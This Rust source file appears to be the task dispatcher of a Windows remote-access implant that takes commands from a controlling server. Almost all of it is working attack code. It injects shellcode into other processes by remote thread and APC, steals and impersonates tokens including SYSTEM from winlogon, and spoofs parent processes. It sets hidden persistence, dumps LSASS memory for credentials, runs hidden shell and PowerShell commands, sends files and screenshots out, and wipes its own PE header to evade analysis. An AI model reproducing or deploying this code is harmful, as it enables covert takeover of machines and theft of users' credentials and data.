/// Command dispatcher — full task parity with the Go/Nim agents.
use std::sync::atomic::{AtomicU64, Ordering};
use std::sync::{Mutex, OnceLock};
use std::process::Command;
use base64::{engine::general_purpose::STANDARD, Engine as _};
use crate::transport::{AgentTransport, TaskWire};

pub static DYN_SLEEP_SEC:  AtomicU64 = AtomicU64::new(u64::MAX);
pub static DYN_JITTER_PCT: AtomicU64 = AtomicU64::new(u64::MAX);

static DYN_WORKING_HOURS: OnceLock<Mutex<String>> = OnceLock::new();
fn dyn_working_hours() -> std::sync::MutexGuard<'static, String> {
    DYN_WORKING_HOURS.get_or_init(|| Mutex::new(String::new())).lock().unwrap()
}

fn shell(cmd: &str) -> String {
    match Command::new("cmd.exe").args(["/s", "/c", cmd]).output() {
        Ok(o) => {
            let mut out = String::from_utf8_lossy(&o.stdout).into_owned();
            let err = String::from_utf8_lossy(&o.stderr);
            if !err.is_empty() { out.push_str(&err); }
            out
        }
        Err(e) => format!("[error: {}]", e),
    }
}

fn ps(script: &str) -> String {
    match Command::new("powershell.exe")
        .args(["-NoP", "-NonI", "-W", "Hidden", "-C", script])
        .output()
    {
        Ok(o) => {
            let mut s = String::from_utf8_lossy(&o.stdout).into_owned();
            let e = String::from_utf8_lossy(&o.stderr);
            if !e.is_empty() { s.push_str(&e); }
            s
        }
        Err(e) => format!("[ps error: {}]", e),
    }
}

fn wide(s: &str) -> Vec<u16> {
    s.encode_utf16().chain([0u16]).collect()
}

// ── Native Windows helpers ────────────────────────────────────────────────────

use windows_sys::Win32::Foundation::{
    CloseHandle, GetLastError, HANDLE, INVALID_HANDLE_VALUE, LUID, PAPCFUNC,
};
use windows_sys::Win32::System::Threading::{
    OpenProcess, CreateRemoteThread, OpenThread, GetCurrentProcess, QueueUserAPC,
    OpenProcessToken, CreateProcessW, ResumeThread,
    InitializeProcThreadAttributeList, UpdateProcThreadAttribute, DeleteProcThreadAttributeList,
    PROCESS_ALL_ACCESS, PROCESS_QUERY_INFORMATION, PROCESS_CREATE_PROCESS, THREAD_SET_CONTEXT,
    EXTENDED_STARTUPINFO_PRESENT, CREATE_SUSPENDED, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
    STARTUPINFOEXW, PROCESS_INFORMATION, LPPROC_THREAD_ATTRIBUTE_LIST,
};
use windows_sys::Win32::System::Memory::{
    VirtualAllocEx, VirtualProtectEx,
    GetProcessHeap, HeapAlloc, HeapFree,
    MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE, PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE,
};
use windows_sys::Win32::System::Diagnostics::Debug::{
    WriteProcessMemory, GetThreadContext, SetThreadContext,
    CONTEXT, CONTEXT_DEBUG_REGISTERS_AMD64,
};
use windows_sys::Win32::System::LibraryLoader::GetModuleHandleW;
use windows_sys::Win32::System::Memory::VirtualProtect;
use windows_sys::Win32::System::Diagnostics::ToolHelp::{
    CreateToolhelp32Snapshot, Thread32First, Thread32Next,
    Process32First, Process32Next,
    THREADENTRY32, PROCESSENTRY32, TH32CS_SNAPTHREAD, TH32CS_SNAPPROCESS,
};
use windows_sys::Win32::Security::{
    DuplicateTokenEx, ImpersonateLoggedOnUser, RevertToSelf,
    AdjustTokenPrivileges, LookupPrivilegeValueW,
    LogonUserW, LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_WINNT50,
    SecurityImpersonation, TokenImpersonation,
    TOKEN_ALL_ACCESS, TOKEN_DUPLICATE, TOKEN_QUERY, TOKEN_ADJUST_PRIVILEGES,
    SE_PRIVILEGE_ENABLED, TOKEN_PRIVILEGES, LUID_AND_ATTRIBUTES,
};

unsafe fn enable_priv(htok: HANDLE, priv_name: &str) -> bool {
    let name_w = wide(priv_name);
    let mut luid: LUID = std::mem::zeroed();
    if LookupPrivilegeValueW(std::ptr::null(), name_w.as_ptr(), &mut luid) == 0 { return false; }
    let tp = TOKEN_PRIVILEGES {
        PrivilegeCount: 1,
        Privileges: [LUID_AND_ATTRIBUTES { Luid: luid, Attributes: SE_PRIVILEGE_ENABLED }],
    };
    AdjustTokenPrivileges(htok, 0, &tp, std::mem::size_of::<TOKEN_PRIVILEGES>() as u32,
        std::ptr::null_mut(), std::ptr::null_mut()) != 0
}

unsafe fn inject_remote(pid: u32, sc: &[u8]) -> String {
    let hproc = OpenProcess(PROCESS_ALL_ACCESS, 0, pid);
    if hproc == 0 { return format!("OpenProcess failed (err {})", GetLastError()); }
    let mem = VirtualAllocEx(hproc, std::ptr::null(), sc.len(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if mem.is_null() { CloseHandle(hproc); return format!("VirtualAllocEx failed (err {})", GetLastError()); }
    let mut written = 0usize;
    WriteProcessMemory(hproc, mem, sc.as_ptr() as *const _, sc.len(), &mut written);
    let mut old = 0u32;
    VirtualProtectEx(hproc, mem, sc.len(), PAGE_EXECUTE_READ, &mut old);
    let start: windows_sys::Win32::System::Threading::LPTHREAD_START_ROUTINE =
        Some(std::mem::transmute::<*mut std::ffi::c_void, unsafe extern "system" fn(*mut std::ffi::c_void) -> u32>(mem));
    let mut tid = 0u32;
    let ht = CreateRemoteThread(hproc, std::ptr::null(), 0, start, std::ptr::null(), 0, &mut tid);
    CloseHandle(hproc);
    if ht == 0 { return format!("CreateRemoteThread failed (err {})", GetLastError()); }
    CloseHandle(ht);
    format!("[+] injected {} bytes into PID {} (TID={})", sc.len(), pid, tid)
}

unsafe fn inject_apc(pid: u32, sc: &[u8]) -> String {
    let hproc = OpenProcess(PROCESS_ALL_ACCESS, 0, pid);
    if hproc == 0 { return format!("OpenProcess failed (err {})", GetLastError()); }
    let mem = VirtualAllocEx(hproc, std::ptr::null(), sc.len(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if mem.is_null() { CloseHandle(hproc); return format!("VirtualAllocEx failed (err {})", GetLastError()); }
    let mut written = 0usize;
    WriteProcessMemory(hproc, mem, sc.as_ptr() as *const _, sc.len(), &mut written);
    let snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if snap == INVALID_HANDLE_VALUE { CloseHandle(hproc); return "snapshot failed".into(); }
    let mut te: THREADENTRY32 = std::mem::zeroed();
    te.dwSize = std::mem::size_of::<THREADENTRY32>() as u32;
    let mut queued = 0u32;
    if Thread32First(snap, &mut te) != 0 {
        loop {
            if te.th32OwnerProcessID == pid {
                let ht = OpenThread(THREAD_SET_CONTEXT, 0, te.th32ThreadID);
                if ht != 0 {
                    let apc_fn: PAPCFUNC =
                        Some(std::mem::transmute::<*mut std::ffi::c_void, unsafe extern "system" fn(usize)>(mem));
                    QueueUserAPC(apc_fn, ht, 0);
                    CloseHandle(ht);
                    queued += 1;
                }
            }
            if Thread32Next(snap, &mut te) == 0 { break; }
        }
    }
    CloseHandle(snap);
    CloseHandle(hproc);
    format!("[+] APC queued to {} thread(s) in PID {}", queued, pid)
}

unsafe fn token_steal(pid: u32) -> String {
    let mut hself = 0isize;
    if OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &mut hself) != 0 {
        enable_priv(hself, "SeDebugPrivilege");
        CloseHandle(hself);
    }
    let hproc = OpenProcess(PROCESS_QUERY_INFORMATION, 0, pid);
    if hproc == 0 { return format!("OpenProcess failed (err {})", GetLastError()); }
    let mut htok = 0isize;
    if OpenProcessToken(hproc, TOKEN_DUPLICATE | TOKEN_QUERY, &mut htok) == 0 {
        CloseHandle(hproc);
        return format!("OpenProcessToken failed (err {})", GetLastError());
    }
    CloseHandle(hproc);
    let mut hdup = 0isize;
    DuplicateTokenEx(htok, TOKEN_ALL_ACCESS, std::ptr::null(),
        SecurityImpersonation, TokenImpersonation, &mut hdup);
    CloseHandle(htok);
    if hdup == 0 { return format!("DuplicateTokenEx failed (err {})", GetLastError()); }
    if ImpersonateLoggedOnUser(hdup) == 0 {
        CloseHandle(hdup);
        return format!("ImpersonateLoggedOnUser failed (err {})", GetLastError());
    }
    CloseHandle(hdup);
    format!("[+] impersonating token from PID {}", pid)
}

unsafe fn token_make(user: &str, domain: &str, pass: &str) -> String {
    let wu = wide(user); let wd = wide(domain); let wp = wide(pass);
    let mut htok = 0isize;
    if LogonUserW(wu.as_ptr(), wd.as_ptr(), wp.as_ptr(),
        LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_WINNT50, &mut htok) == 0 {
        return format!("LogonUser failed (err {})", GetLastError());
    }
    if ImpersonateLoggedOnUser(htok) == 0 {
        CloseHandle(htok);
        return format!("ImpersonateLoggedOnUser failed (err {})", GetLastError());
    }
    CloseHandle(htok);
    format!("[+] impersonating {}\\{}", domain, user)
}

unsafe fn get_system() -> String {
    let mut hself = 0isize;
    if OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &mut hself) != 0 {
        enable_priv(hself, "SeDebugPrivilege");
        CloseHandle(hself);
    }
    let snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if snap == INVALID_HANDLE_VALUE { return "CreateToolhelp32Snapshot failed".into(); }
    let mut pe: PROCESSENTRY32 = std::mem::zeroed();
    pe.dwSize = std::mem::size_of::<PROCESSENTRY32>() as u32;
    let mut sys_pid = 0u32;
    if Process32First(snap, &mut pe) != 0 {
        loop {
            let end = pe.szExeFile.iter().position(|&b| b == 0).unwrap_or(pe.szExeFile.len());
            let name = String::from_utf8_lossy(&pe.szExeFile[..end]);
            if name.eq_ignore_ascii_case("winlogon.exe") { sys_pid = pe.th32ProcessID; break; }
            if Process32Next(snap, &mut pe) == 0 { break; }
        }
    }
    CloseHandle(snap);
    if sys_pid == 0 { return "winlogon.exe not found".into(); }
    let hproc = OpenProcess(PROCESS_QUERY_INFORMATION, 0, sys_pid);
    if hproc == 0 { return format!("OpenProcess failed (err {})", GetLastError()); }
    let mut htok = 0isize;
    if OpenProcessToken(hproc, TOKEN_DUPLICATE, &mut htok) == 0 {
        CloseHandle(hproc);
        return format!("OpenProcessToken failed (err {})", GetLastError());
    }
    CloseHandle(hproc);
    let mut hdup = 0isize;
    DuplicateTokenEx(htok, TOKEN_ALL_ACCESS, std::ptr::null(),
        SecurityImpersonation, TokenImpersonation, &mut hdup);
    CloseHandle(htok);
    if hdup == 0 { return format!("DuplicateTokenEx failed (err {})", GetLastError()); }
    if ImpersonateLoggedOnUser(hdup) == 0 {
        CloseHandle(hdup);
        return format!("ImpersonateLoggedOnUser failed (err {})", GetLastError());
    }
    CloseHandle(hdup);
    format!("[+] SYSTEM token (winlogon PID={})", sys_pid)
}

unsafe fn spawn_with_ppid(cmd: &str, parent_name: &str) -> String {
    let snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if snap == INVALID_HANDLE_VALUE { return "CreateToolhelp32Snapshot failed".into(); }
    let mut pe: PROCESSENTRY32 = std::mem::zeroed();
    pe.dwSize = std::mem::size_of::<PROCESSENTRY32>() as u32;
    let mut parent_pid = 0u32;
    if Process32First(snap, &mut pe) != 0 {
        loop {
            let end = pe.szExeFile.iter().position(|&b| b == 0).unwrap_or(pe.szExeFile.len());
            let name = String::from_utf8_lossy(&pe.szExeFile[..end]);
            if name.eq_ignore_ascii_case(parent_name) { parent_pid = pe.th32ProcessID; break; }
            if Process32Next(snap, &mut pe) == 0 { break; }
        }
    }
    CloseHandle(snap);
    if parent_pid == 0 { return format!("process '{}' not found", parent_name); }

    let hparent = OpenProcess(PROCESS_CREATE_PROCESS, 0, parent_pid);
    if hparent == 0 { return format!("OpenProcess(parent) failed (err {})", GetLastError()); }

    let mut attr_size = 0usize;
    InitializeProcThreadAttributeList(std::ptr::null_mut(), 1, 0, &mut attr_size);
    let heap = GetProcessHeap();
    let attr_list = HeapAlloc(heap, 0, attr_size) as LPPROC_THREAD_ATTRIBUTE_LIST;
    if attr_list.is_null() { CloseHandle(hparent); return "HeapAlloc failed".into(); }
    InitializeProcThreadAttributeList(attr_list, 1, 0, &mut attr_size);
    UpdateProcThreadAttribute(
        attr_list, 0,
        PROC_THREAD_ATTRIBUTE_PARENT_PROCESS as usize,
        &hparent as *const HANDLE as *const _,
        std::mem::size_of::<HANDLE>(),
        std::ptr::null_mut(),
        std::ptr::null(),
    );

    let mut si: STARTUPINFOEXW = std::mem::zeroed();
    si.StartupInfo.cb = std::mem::size_of::<STARTUPINFOEXW>() as u32;
    si.lpAttributeList = attr_list;
    let mut pi: PROCESS_INFORMATION = std::mem::zeroed();
    let mut cmd_w = wide(cmd);
    let ok = CreateProcessW(
        std::ptr::null(), cmd_w.as_mut_ptr(),
        std::ptr::null(), std::ptr::null(), 0,
        EXTENDED_STARTUPINFO_PRESENT | CREATE_SUSPENDED,
        std::ptr::null(), std::ptr::null(),
        &si.StartupInfo, &mut pi,
    );
    DeleteProcThreadAttributeList(attr_list);
    HeapFree(heap, 0, attr_list as *const _);
    CloseHandle(hparent);
    if ok == 0 {
        return format!("CreateProcessW failed (err {})", GetLastError());
    }
    ResumeThread(pi.hThread);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    format!("[+] spawned '{}' (PID={}) with parent {}({})", cmd, pi.dwProcessId, parent_name, parent_pid)
}

fn sysinfo() -> String {
    let hostname = std::env::var("COMPUTERNAME").unwrap_or_else(|_| "UNKNOWN".into());
    let username = std::env::var("USERNAME").unwrap_or_else(|_| "UNKNOWN".into());
    let arch = if cfg!(target_arch = "x86_64") { "amd64" } else { "x86" };
    format!(
        "hostname={}\nusername={}\nos=windows/{}\npid={}",
        hostname, username, arch, std::process::id()
    )
}

fn ls(path: &str) -> String {
    let dir = if path.is_empty() {
        std::env::current_dir().unwrap_or_default().to_string_lossy().into_owned()
    } else {
        path.to_string()
    };
    match std::fs::read_dir(&dir) {
        Ok(entries) => entries
            .filter_map(|e| e.ok())
            .map(|e| {
                let kind = if e.path().is_dir() { "D" } else { "F" };
                format!("{}  {}", kind, e.path().display())
            })
            .collect::<Vec<_>>()
            .join("\n"),
        Err(e) => format!("[error: {}]", e),
    }
}

pub fn dispatch(t: &mut AgentTransport, task: &TaskWire) {
    let typ = task.typ.to_uppercase();
    match typ.as_str() {
        "SHELL" => {
            t.send_result(task.id, &shell(&task.args), "");
        }
        "SLEEP" => {
            let parts: Vec<&str> = task.args.split_whitespace().collect();
            if let Some(s) = parts.first().and_then(|v| v.parse::<u64>().ok()) {
                DYN_SLEEP_SEC.store(s, Ordering::Relaxed);
            }
            if let Some(j) = parts.get(1).and_then(|v| v.parse::<u64>().ok()) {
                DYN_JITTER_PCT.store(j, Ordering::Relaxed);
            }
            t.send_result(task.id, "[+] sleep updated", "");
        }
        "SYSINFO" => {
            t.send_result(task.id, &sysinfo(), "");
        }
        "PS" => {
            t.send_result(task.id, &shell("tasklist /FO CSV /NH 2>&1"), "");
        }
        "PWD" => {
            let cwd = std::env::current_dir()
                .map(|p| p.to_string_lossy().into_owned())
                .unwrap_or_else(|e| format!("[error: {}]", e));
            t.send_result(task.id, &cwd, "");
        }
        "CD" => match std::env::set_current_dir(&task.args) {
            Ok(_) => {
                let cwd = std::env::current_dir()
                    .map(|p| p.to_string_lossy().into_owned())
                    .unwrap_or_default();
                t.send_result(task.id, &cwd, "");
            }
            Err(e) => t.send_result(task.id, "", &format!("cd: {}", e)),
        },
        "LS" => {
            t.send_result(task.id, &ls(&task.args), "");
        }
        "KILL" => {
            t.send_result(task.id, "bye", "");
            std::process::exit(0);
        }
        "UPLOAD" => {
            // Server pushes file to agent: args = JSON {"filename":"...","remote_path":"..."}
            let j: serde_json::Value = match serde_json::from_str(&task.args) {
                Ok(v) => v,
                Err(e) => {
                    t.send_result(task.id, "", &format!("json parse: {}", e));
                    return;
                }
            };
            let filename    = j["filename"].as_str().unwrap_or("");
            let remote_path = j["remote_path"].as_str().unwrap_or("");
            let data = t.download_file(filename);
            if data.is_empty() {
                t.send_result(task.id, "", "download from server failed");
                return;
            }
            match std::fs::write(remote_path, &data) {
                Ok(_) => t.send_result(
                    task.id,
                    &format!("written {} bytes to {}", data.len(), remote_path),
                    "",
                ),
                Err(e) => t.send_result(task.id, "", &format!("write: {}", e)),
            }
        }
        "DOWNLOAD" => {
            // Agent reads local file and uploads to server
            let path = &task.args;
            let name = std::path::Path::new(path)
                .file_name()
                .map(|n| n.to_string_lossy().into_owned())
                .unwrap_or_else(|| path.clone());
            match std::fs::read(path) {
                Ok(data) => {
                    let n = data.len();
                    t.upload_file(task.id, &name, &data);
                    t.send_result(task.id, &format!("uploaded {} bytes", n), "");
                }
                Err(e) => t.send_result(task.id, "", &format!("read: {}", e)),
            }
        }
        "CAT" => {
            match std::fs::read_to_string(&task.args) {
                Ok(s) => t.send_result(task.id, &s, ""),
                Err(e) => t.send_result(task.id, "", &format!("cat: {}", e)),
            }
        }
        "MKDIR" => {
            match std::fs::create_dir_all(&task.args) {
                Ok(_) => t.send_result(task.id, "[+] created", ""),
                Err(e) => t.send_result(task.id, "", &format!("mkdir: {}", e)),
            }
        }
        "RM" => {
            let r = if std::path::Path::new(&task.args).is_dir() {
                std::fs::remove_dir_all(&task.args)
            } else {
                std::fs::remove_file(&task.args)
            };
            match r {
                Ok(_) => t.send_result(task.id, "[+] removed", ""),
                Err(e) => t.send_result(task.id, "", &format!("rm: {}", e)),
            }
        }
        "ENV" => {
            let out = std::env::vars()
                .map(|(k, v)| format!("{}={}", k, v))
                .collect::<Vec<_>>()
                .join("\n");
            t.send_result(task.id, &out, "");
        }
        "SCREENSHOT" => {
            let sc_ps = concat!(
                "Add-Type -AssemblyName System.Windows.Forms,System.Drawing;",
                "$bmp=[System.Drawing.Bitmap]::new([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width,",
                "[System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height);",
                "$gfx=[System.Drawing.Graphics]::FromImage($bmp);",
                "$gfx.CopyFromScreen(0,0,0,0,$bmp.Size);",
                "$ms=[System.IO.MemoryStream]::new();$bmp.Save($ms,'Png');",
                "[Convert]::ToBase64String($ms.ToArray())"
            );
            match Command::new("powershell.exe").args(["-NoP","-NonI","-W","Hidden","-C",sc_ps]).output() {
                Ok(o) if o.status.success() => {
                    let b64 = String::from_utf8_lossy(&o.stdout).trim().to_string();
                    if let Ok(png) = STANDARD.decode(&b64) {
                        t.upload_file(task.id, "screenshot.png", &png);
                        t.send_result(task.id, "[+] screenshot uploaded", "");
                    } else { t.send_result(task.id, "", "base64 decode failed"); }
                }
                Ok(o) => t.send_result(task.id, "", &String::from_utf8_lossy(&o.stderr)),
                Err(e) => t.send_result(task.id, "", &format!("screenshot: {}", e)),
            }
        }
        "CONFIG" => {
            let j: serde_json::Value = serde_json::from_str(&task.args).unwrap_or_default();
            if let Some(s) = j.get("sleep_sec").and_then(|v| v.as_u64()) {
                DYN_SLEEP_SEC.store(s, Ordering::Relaxed);
            }
            if let Some(j2) = j.get("jitter_pct").and_then(|v| v.as_u64()) {
                DYN_JITTER_PCT.store(j2, Ordering::Relaxed);
            }
            if let Some(wh) = j.get("working_hours").and_then(|v| v.as_str()) {
                *dyn_working_hours() = wh.to_string();
            }
            t.send_result(task.id, "[+] config updated", "");
        }
        "INJECT_REMOTE" => {
            if task.payload.is_empty() { t.send_result(task.id, "", "no shellcode payload"); return; }
            let pid = serde_json::from_str::<serde_json::Value>(&task.args)
                .ok().and_then(|v| v.get("pid").and_then(|p| p.as_u64())).unwrap_or(0) as u32;
            if pid == 0 { t.send_result(task.id, "", "INJECT_REMOTE requires {\"pid\":N}"); return; }
            let r = unsafe { inject_remote(pid, &task.payload) };
            t.send_result(task.id, &r, "");
        }
        "INJECT_APC" => {
            if task.payload.is_empty() { t.send_result(task.id, "", "no shellcode payload"); return; }
            let pid = serde_json::from_str::<serde_json::Value>(&task.args)
                .ok().and_then(|v| v.get("pid").and_then(|p| p.as_u64())).unwrap_or(0) as u32;
            if pid == 0 { t.send_result(task.id, "", "INJECT_APC requires {\"pid\":N}"); return; }
            let r = unsafe { inject_apc(pid, &task.payload) };
            t.send_result(task.id, &r, "");
        }
        "TOKEN_STEAL" => {
            let pid = serde_json::from_str::<serde_json::Value>(&task.args)
                .ok().and_then(|v| v.get("pid").and_then(|p| p.as_u64())).unwrap_or(0) as u32;
            if pid == 0 { t.send_result(task.id, "", "TOKEN_STEAL requires {\"pid\":N}"); return; }
            let r = unsafe { token_steal(pid) };
            t.send_result(task.id, &r, "");
        }
        "TOKEN_MAKE" => {
            let j: serde_json::Value = serde_json::from_str(&task.args).unwrap_or_default();
            let user   = j.get("user").and_then(|v| v.as_str()).unwrap_or("");
            let domain = j.get("domain").and_then(|v| v.as_str()).unwrap_or(".");
            let pass   = j.get("pass").and_then(|v| v.as_str()).unwrap_or("");
            if user.is_empty() || pass.is_empty() {
                t.send_result(task.id, "", "TOKEN_MAKE requires user+pass"); return;
            }
            let r = unsafe { token_make(user, domain, pass) };
            t.send_result(task.id, &r, "");
        }
        "TOKEN_DROP" => {
            unsafe { RevertToSelf(); }
            t.send_result(task.id, "[+] reverted to original token", "");
        }
        "TOKEN_WHOAMI" => {
            t.send_result(task.id, &shell("whoami 2>&1"), "");
        }
        "GETSYSTEM" => {
            let r = unsafe { get_system() };
            t.send_result(task.id, &r, "");
        }
        "PERSIST" => {
            let j: serde_json::Value = serde_json::from_str(&task.args).unwrap_or_default();
            let name = j.get("name").and_then(|v| v.as_str()).unwrap_or("Updater");
            let cmd2 = j.get("cmd").and_then(|v| v.as_str()).unwrap_or("");
            let meth = j.get("method").and_then(|v| v.as_str()).unwrap_or("registry");
            if cmd2.is_empty() { t.send_result(task.id, "", "PERSIST requires cmd"); return; }
            let out = if meth == "schtask" {
                shell(&format!("schtasks /create /tn \"{}\" /tr \"{}\" /sc ONLOGON /ru SYSTEM /f 2>&1", name, cmd2))
            } else {
                shell(&format!("reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"{}\" /t REG_SZ /d \"{}\" /f 2>&1", name, cmd2))
            };
            t.send_result(task.id, &out, "");
        }
        "PERSIST_RM" => {
            let j: serde_json::Value = serde_json::from_str(&task.args).unwrap_or_default();
            let name = j.get("name").and_then(|v| v.as_str()).unwrap_or("");
            let meth = j.get("method").and_then(|v| v.as_str()).unwrap_or("registry");
            if name.is_empty() { t.send_result(task.id, "", "PERSIST_RM requires name"); return; }
            let out = if meth == "schtask" {
                shell(&format!("schtasks /delete /tn \"{}\" /f 2>&1", name))
            } else {
                shell(&format!("reg delete \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"{}\" /f 2>&1", name))
            };
            t.send_result(task.id, &out, "");
        }
        "REG_QUERY" => {
            t.send_result(task.id, &shell(&format!("reg query \"{}\" 2>&1", task.args)), "");
        }
        "REG_LIST" => {
            t.send_result(task.id, &shell(&format!("reg query \"{}\" /s 2>&1", task.args)), "");
        }
        "REG_SET" => {
            let j: serde_json::Value = serde_json::from_str(&task.args).unwrap_or_default();
            let path = j.get("path").and_then(|v| v.as_str()).unwrap_or("");
            let name = j.get("name").and_then(|v| v.as_str()).unwrap_or("");
            let typ2 = j.get("type").and_then(|v| v.as_str()).unwrap_or("REG_SZ");
            let val  = j.get("value").and_then(|v| v.as_str()).unwrap_or("");
            let out  = shell(&format!("reg add \"{}\" /v \"{}\" /t {} /d \"{}\" /f 2>&1", path, name, typ2, val));
            t.send_result(task.id, &out, "");
        }
        "REG_DELETE" => {
            let j: serde_json::Value = serde_json::from_str(&task.args).unwrap_or_default();
            let path = j.get("path").and_then(|v| v.as_str()).unwrap_or("");
            let name = j.get("name").and_then(|v| v.as_str()).unwrap_or("");
            let cmd2 = if name.is_empty() {
                format!("reg delete \"{}\" /f 2>&1", path)
            } else {
                format!("reg delete \"{}\" /v \"{}\" /f 2>&1", path, name)
            };
            t.send_result(task.id, &shell(&cmd2), "");
        }
        "PORT_SCAN" => {
            let j: serde_json::Value = serde_json::from_str(&task.args).unwrap_or_default();
            let host    = j.get("host").and_then(|v| v.as_str()).unwrap_or("127.0.0.1");
            let ports   = j.get("ports").and_then(|v| v.as_str()).unwrap_or("80,443,445,3389");
            let timeout = j.get("timeout").and_then(|v| v.as_u64()).unwrap_or(500);
            let script = format!(
                "$h='{}';$t={};'{}'.Split(',') | ForEach-Object {{ $p=[int]$_;\
                $s=New-Object System.Net.Sockets.TcpClient;\
                $a=$s.BeginConnect($h,$p,$null,$null);\
                if($a.AsyncWaitHandle.WaitOne($t)){{if($s.Connected){{'OPEN '+$h+':'+$p}};$s.Close()}} }}",
                host, timeout, ports
            );
            let out = ps(&script);
            t.send_result(task.id, if out.trim().is_empty() { "no open ports" } else { &out }, "");
        }
        "MINIDUMP" => {
            let j: serde_json::Value = serde_json::from_str(&task.args).unwrap_or_default();
            let path = j.get("path").and_then(|v| v.as_str()).unwrap_or("C:\\Windows\\Temp\\1.dmp");
            let script = format!(
                "$p=(Get-Process lsass).Id; rundll32.exe C:\\Windows\\System32\\comsvcs.dll,MiniDump $p '{}' full",
                path
            );
            let out = ps(&script);
            if out.trim().is_empty() {
                t.send_result(task.id, &format!("[+] dump written to {}", path), "");
            } else {
                t.send_result(task.id, &out, "");
            }
        }
        "PPID" => {
            let j: serde_json::Value = serde_json::from_str(&task.args).unwrap_or_default();
            let cmd2   = j.get("cmd").and_then(|v| v.as_str()).unwrap_or("");
            let parent = j.get("parent").and_then(|v| v.as_str()).unwrap_or("explorer.exe");
            if cmd2.is_empty() { t.send_result(task.id, "", "PPID requires {\"cmd\":\"...\"}"); return; }
            let r = unsafe { spawn_with_ppid(cmd2, parent) };
            t.send_result(task.id, &r, "");
        }
        "HWBP_CLEAR" => {
            use windows_sys::Win32::System::Threading::{GetCurrentThreadId, THREAD_GET_CONTEXT, THREAD_SET_CONTEXT};
            let r = unsafe {
                let tid = GetCurrentThreadId();
                let ht = OpenThread(THREAD_GET_CONTEXT | THREAD_SET_CONTEXT, 0, tid);
                if ht == 0 {
                    format!("OpenThread failed (err {})", GetLastError())
                } else {
                    let mut ctx: CONTEXT = std::mem::zeroed();
                    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS_AMD64;
                    if GetThreadContext(ht, &mut ctx) != 0 {
                        ctx.Dr0 = 0; ctx.Dr1 = 0; ctx.Dr2 = 0; ctx.Dr3 = 0;
                        ctx.Dr6 = 0; ctx.Dr7 = 0;
                        SetThreadContext(ht, &ctx);
                    }
                    CloseHandle(ht);
                    "[+] hardware breakpoints cleared".to_string()
                }
            };
            t.send_result(task.id, &r, "");
        }
        "WIPE_MZ" => {
            let r = unsafe {
                let base = GetModuleHandleW(std::ptr::null()) as *mut u8;
                if base.is_null() {
                    format!("GetModuleHandleW failed (err {})", GetLastError())
                } else {
                    let mut old = 0u32;
                    VirtualProtect(base as *const _, 2, PAGE_READWRITE, &mut old);
                    *base = 0;
                    *base.add(1) = 0;
                    VirtualProtect(base as *const _, 2, old, &mut old);
                    "[+] MZ header wiped".to_string()
                }
            };
            t.send_result(task.id, &r, "");
        }
        _ => {
            t.send_result(task.id, "", &format!("unknown task type: {}", task.typ));
        }
    }
}
